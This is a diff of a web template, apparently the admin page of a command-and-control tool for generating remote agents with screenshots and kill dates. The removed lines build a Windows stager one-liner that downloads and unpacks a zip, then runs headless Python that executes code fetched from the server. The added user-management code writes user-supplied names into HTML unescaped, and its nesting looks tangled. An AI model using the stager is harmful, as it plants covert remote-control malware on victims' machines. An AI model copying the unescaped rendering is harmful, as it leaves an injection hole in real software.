@@ -36,25 +36,36 @@
                 </div>
                 <div class="card-body">
                     <div class="table-responsive">
-                        <table class="table">
+                        <table class="table" id="usersTable">
                             <thead>
                                 <tr>
                                     <th>Username</th>
+                                    <th>Email</th>
                                     <th>Actions</th>
                                 </tr>
                             </thead>
                             <tbody>
-                                <tr>
-                                    <td>admin</td>
-                                    <td>
-                                        <button class="btn btn-sm btn-outline-secondary" disabled>
-                                            <i class="fas fa-key me-1"></i>Change Password
-                                        </button>
-                                    </td>
-                                </tr>
+                                <!-- User rows will be populated by JS -->
                             </tbody>
                         </table>
                     </div>
+                    <hr>
+                    <h6>Add New User</h6>
+                    <form id="addUserForm">
+                        <div class="mb-3">
+                            <label for="newUsername" class="form-label">Username</label>
+                            <input type="text" class="form-control" id="newUsername" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="newEmail" class="form-label">Email</label>
+                            <input type="email" class="form-control" id="newEmail" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="newPassword" class="form-label">Password</label>
+                            <input type="password" class="form-control" id="newPassword" required>
+                        </div>
+                        <button type="submit" class="btn btn-primary">Add User</button>
+                    </form>
                 </div>
             </div>
         </div>
@@ -139,17 +150,7 @@
                             overflow-x: auto;
                             white-space: nowrap;
                         ">
-                            <!-- Command here -->
-                            <button id="copyButton" class="btn btn-sm btn-secondary" style="
-                                position: absolute;
-                                top: 5px;
-                                right: 5px;
-                                padding: 2px 8px;
-                                font-size: 12px;
-                                opacity: 0.8;
-                            ">
-                                <i class="fas fa-copy"></i> Copy
-                            </button>
+                            <!-- Updated to show two commands with separate copy buttons -->
                         </div>
 
 
@@ -161,116 +162,217 @@
 </div>
 
 <script>
-function copyUrl() {
-    // Get form values
-    const url = document.getElementById('serverUrl').value;
-    const enableKillDate = document.getElementById('enableKillDate').checked;
-    const killDate = document.getElementById('killDate').value;
-    const trustedCert = document.getElementById('trustedCertificate').checked;
-    
-    // Format kill date for display if enabled
-    let killDateDisplay = '';
-    if (enableKillDate && killDate) {
-        const dateObj = new Date(killDate);
-        const formattedDate = dateObj.toISOString().replace('T', ' ').substring(0, 16);
-        killDateDisplay = `\n<span style="color: #569cd6;"># Kill Date:</span> <span style="color: #ce9178;">${formattedDate}</span>`;
-    }
-
-    // Create the command based on trusted certificate setting
-    let command;
-    if (trustedCert) {
-        command = `curl -s ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c "import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"`;
-    } else {
-        command = `curl -ks ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c "import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
-    }
-    
-    // Display it with syntax highlighting and kill date info
-    const curlOption = trustedCert ? '-s' : '-ks';
-    const pythonCode = trustedCert ? 
-        `"<span style="color: #569cd6;">import</span> urllib3;<span style="color: #569cd6;">import</span> requests;url='${url}/a/d';<span style="color: #569cd6;">exec</span>(requests.<span style="color: #dcdcaa;">get</span>(url).text)"` :
-        `"<span style="color: #569cd6;">import</span> urllib3;urllib3.<span style="color: #dcdcaa;">disable_warnings</span>(urllib3.exceptions.InsecureRequestWarning);<span style="color: #569cd6;">import</span> requests;url='${url}/a/d';<span style="color: #569cd6;">exec</span>(requests.<span style="color: #dcdcaa;">get</span>(url,verify=<span style="color: #569cd6;">False</span>).text)"`;
-    
-    document.getElementById('displayArea').innerHTML = `
-        <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">${curlOption}</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${pythonCode}
-        ${killDateDisplay}
-        <button id="copyButton" class="btn btn-sm btn-secondary" style="
-            position: absolute;
-            top: 5px;
-            right: 5px;
-            padding: 2px 8px;
-            font-size: 12px;
-            opacity: 0.8;
-        ">
-            <i class="fas fa-copy"></i> Copy
-        </button>`;
-    
-    // Add copy functionality
-    document.getElementById('copyButton').addEventListener('click', function() {
-        navigator.clipboard.writeText(command).then(function() {
-            const originalText = this.innerHTML;
-            this.innerHTML = '<i class="fas fa-check"></i> Copied!';
-            setTimeout(() => {
-                this.innerHTML = originalText;
-            }, 2000);
-        }.bind(this));
-    });
-}
-
-// Add event listener for the trusted certificate checkbox
 document.addEventListener('DOMContentLoaded', function() {
-    const trustedCertCheckbox = document.getElementById('trustedCertificate');
-    if (trustedCertCheckbox) {
-        trustedCertCheckbox.addEventListener('change', function() {
-            // Only regenerate if the download section is visible
-            if (document.getElementById('agentDownload').style.display === 'block') {
-                copyUrl();
+    // Fetch and display users
+    function fetchUsers() {
+        fetch('/api/users')
+            .then(response => response.json())
+            .then(users => {
+                const tbody = document.querySelector('#usersTable tbody');
+                tbody.innerHTML = '';
+                users.forEach(user => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${user.username}</td>
+                        <td>${user.email}</td>
+                        <td>
+                            <button class="btn btn-sm btn-outline-secondary change-password-btn me-2" data-user-id="${user.id}" data-username="${user.username}">
+                                <i class="fas fa-key me-1"></i>Change Password
+                            </button>
+                            <button class="btn btn-sm btn-outline-primary edit-user-btn me-2" data-user-id="${user.id}" data-username="${user.username}" data-email="${user.email}">
+                                <i class="fas fa-edit me-1"></i>Edit
+                            </button>
+                            <button class="btn btn-sm btn-outline-danger delete-user-btn" data-user-id="${user.id}" data-username="${user.username}">
+                                <i class="fas fa-trash me-1"></i>Delete
+                            </button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+    // Add event listeners for change password buttons
+    document.querySelectorAll('.change-password-btn').forEach(button => {
+        button.addEventListener('click', function() {
+            const userId = this.getAttribute('data-user-id');
+            const username = this.getAttribute('data-username');
+            showChangePasswordModal(userId, username);
+        });
+    });
+
+    // Add event listeners for delete user buttons
+    document.querySelectorAll('.delete-user-btn').forEach(button => {
+        button.addEventListener('click', function() {
+            const userId = this.getAttribute('data-user-id');
+            const username = this.getAttribute('data-username');
+            if (confirm(`Are you sure you want to delete user "${username}"?`)) {
+                fetch(`/api/users/${userId}`, {
+                    method: 'DELETE'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert(data.message || data.error);
+                    fetchUsers();
+                })
+                .catch(() => {
+                    alert('Error deleting user');
+                });
             }
         });
-    }
-});
-document.addEventListener('DOMContentLoaded', function() {
-    const form = document.getElementById('agentConfigForm');
-    const downloadDiv = document.getElementById('agentDownload');
-    const downloadLink = document.getElementById('downloadLink');
-    const errorDiv = document.getElementById('agentError');
-
-    form.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        errorDiv.style.display = 'none';
-        
-        const config = {
-            checkin_interval: document.getElementById('checkinInterval').value,
-            server_url: document.getElementById('serverUrl').value,
-            take_screenshots: document.getElementById('takeScreenshots').checked,
-            screenshot_frequency: document.getElementById('screenshotFrequency').value,
-            enable_killdate: document.getElementById('enableKillDate').checked,
-            killdate: document.getElementById('killDate').value
-        };
-
-        try {
-            const response = await fetch('/api/generate_agent', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(config)
-            });
-
-            const data = await response.json();
-            
-            if (!response.ok) {
-                throw new Error(data.message || 'Failed to generate agent');
-            }
-
-            downloadLink.href = `/a/d?t=${Date.now()}`;
-            downloadDiv.style.display = 'block';
-            
-        } catch (error) {
-            console.error('Error:', error);
-            errorDiv.textContent = error.message;
-            errorDiv.style.display = 'block';
-        }
     });
+
+    // Add event listeners for edit user buttons
+    document.querySelectorAll('.edit-user-btn').forEach(button => {
+        button.addEventListener('click', function() {
+            const userId = this.getAttribute('data-user-id');
+            const username = this.getAttribute('data-username');
+            const email = this.getAttribute('data-email');
+            showEditUserModal(userId, username, email);
+        });
+    });
+
+    // Show edit user modal
+    function showEditUserModal(userId, username, email) {
+        const modalHtml = `
+            <div class="modal fade" id="editUserModal" tabindex="-1" aria-labelledby="editUserModalLabel" aria-hidden="true">
+              <div class="modal-dialog">
+                <div class="modal-content">
+                  <div class="modal-header">
+                    <h5 class="modal-title" id="editUserModalLabel">Edit User ${username}</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                  </div>
+                  <div class="modal-body">
+                    <form id="editUserForm">
+                      <div class="mb-3">
+                        <label for="editUsernameInput" class="form-label">Username</label>
+                        <input type="text" class="form-control" id="editUsernameInput" value="${username}" required>
+                      </div>
+                      <div class="mb-3">
+                        <label for="editEmailInput" class="form-label">Email</label>
+                        <input type="email" class="form-control" id="editEmailInput" value="${email}" required>
+                      </div>
+                      <button type="submit" class="btn btn-primary">Save Changes</button>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+        `;
+        // Append modal to body
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
+        const modal = new bootstrap.Modal(document.getElementById('editUserModal'));
+        modal.show();
+
+        // Handle form submission
+        document.getElementById('editUserForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const newUsername = document.getElementById('editUsernameInput').value;
+            const newEmail = document.getElementById('editEmailInput').value;
+            fetch(`/api/users/${userId}`, {
+                method: 'PUT',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username: newUsername, email: newEmail})
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message || data.error);
+                modal.hide();
+                document.getElementById('editUserModal').remove();
+                fetchUsers();
+            })
+            .catch(() => {
+                alert('Error updating user');
+            });
+        });
+
+        // Remove modal from DOM on hide
+        document.getElementById('editUserModal').addEventListener('hidden.bs.modal', function () {
+            document.getElementById('editUserModal').remove();
+        });
+    }
+            });
+    }
+
+    // Show change password modal
+    function showChangePasswordModal(userId, username) {
+        const modalHtml = `
+            <div class="modal fade" id="changePasswordModal" tabindex="-1" aria-labelledby="changePasswordModalLabel" aria-hidden="true">
+              <div class="modal-dialog">
+                <div class="modal-content">
+                  <div class="modal-header">
+                    <h5 class="modal-title" id="changePasswordModalLabel">Change Password for ${username}</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                  </div>
+                  <div class="modal-body">
+                    <form id="changePasswordForm">
+                      <div class="mb-3">
+                        <label for="newPasswordInput" class="form-label">New Password</label>
+                        <input type="password" class="form-control" id="newPasswordInput" required>
+                      </div>
+                      <button type="submit" class="btn btn-primary">Change Password</button>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+        `;
+        // Append modal to body
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
+        const modal = new bootstrap.Modal(document.getElementById('changePasswordModal'));
+        modal.show();
+
+        // Handle form submission
+        document.getElementById('changePasswordForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const newPassword = document.getElementById('newPasswordInput').value;
+            fetch(`/api/users/${userId}/change_password`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({new_password: newPassword})
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message || data.error);
+                modal.hide();
+                document.getElementById('changePasswordModal').remove();
+            })
+            .catch(() => {
+                alert('Error changing password');
+            });
+        });
+
+        // Remove modal from DOM on hide
+        document.getElementById('changePasswordModal').addEventListener('hidden.bs.modal', function () {
+            document.getElementById('changePasswordModal').remove();
+        });
+    }
+
+    // Handle add user form submission
+    document.getElementById('addUserForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('newUsername').value;
+        const email = document.getElementById('newEmail').value;
+        const password = document.getElementById('newPassword').value;
+        fetch('/api/users', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({username, email, password})
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert(data.message || data.error);
+            if (data.message) {
+                // Clear form
+                document.getElementById('addUserForm').reset();
+                // Refresh user list
+                fetchUsers();
+            }
+        })
+        .catch(() => {
+            alert('Error adding user');
+        });
+    });
+
+    // Initial fetch of users
+    fetchUsers();
 });
 </script>
 {% endblock %}
